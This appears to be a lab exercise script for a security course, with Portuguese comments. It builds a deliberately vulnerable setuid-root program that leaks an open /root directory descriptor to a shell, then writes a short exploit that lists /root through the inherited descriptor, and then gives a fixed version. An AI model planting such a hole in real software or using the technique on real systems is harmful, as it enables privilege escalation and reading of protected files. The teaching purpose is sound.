#!/bin/bash


# Exercicio 1
cat > backupssi.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main() {
    int dfd;
    char *argv[2];
    dfd = open("/root", O_RDONLY);
    if (dfd == -1) {
        perror("open /root");
        exit(1);
    }
    printf("Directory FD is %d\n", dfd);
    if (mkdir("/root/backupssi", 0700) == -1) {
        perror("mkdir /root/backupssi");
    }
    if (setuid(getuid()) == -1) {
        perror("setuid");
        exit(1);
    }
    argv[0] = "/bin/sh";
    argv[1] = NULL;
    execve(argv[0], argv, NULL);
    perror("execve");
    return 0;
}
EOF

gcc -o backupssi backupssi.c
sudo chown root:root backupssi
sudo chmod 4755 backupssi

# Exercicio 2
# sudo -u a104355 ./backupssi

# Exercicio 3
cat > exploit_backupssi.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>

int main(int argc, char *argv[]) {
    int fd = 3;
    DIR *d;
    struct dirent *ent;

    if (argc == 2) fd = atoi(argv[1]);
    d = fdopendir(fd);
    if (!d) {
        perror("fdopendir");
        return 1;
    }
    printf("Conteudo de /root via FD herdado (%d):\n", fd);
    while ((ent = readdir(d)) != NULL) {
        printf(" - %s\n", ent->d_name);
    }
    closedir(d);
    return 0;
}
EOF
gcc -o exploit_backupssi exploit_backupssi.c
# ./exploit_backupssi 3

# Exercicio 4
cat > backupssi_fixed.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main() {
    int dfd;
    char *argv[2];
    dfd = open("/root", O_RDONLY);
    if (dfd == -1) {
        perror("open /root");
        exit(1);
    }
    if (mkdir("/root/backupssi-fixed", 0700) == -1) {
        perror("mkdir /root/backupssi-fixed");
    }
    if (fcntl(dfd, F_SETFD, FD_CLOEXEC) == -1) {
        perror("fcntl");
    }
    close(dfd);
    if (setuid(getuid()) == -1) {
        perror("setuid");
        exit(1);
    }
    argv[0] = "/bin/sh";
    argv[1] = NULL;
    execve(argv[0], argv, NULL);
    perror("execve");
    return 0;
}
EOF

gcc -o backupssi_fixed backupssi_fixed.c
sudo chown root:root backupssi_fixed
sudo chmod 4755 backupssi_fixed
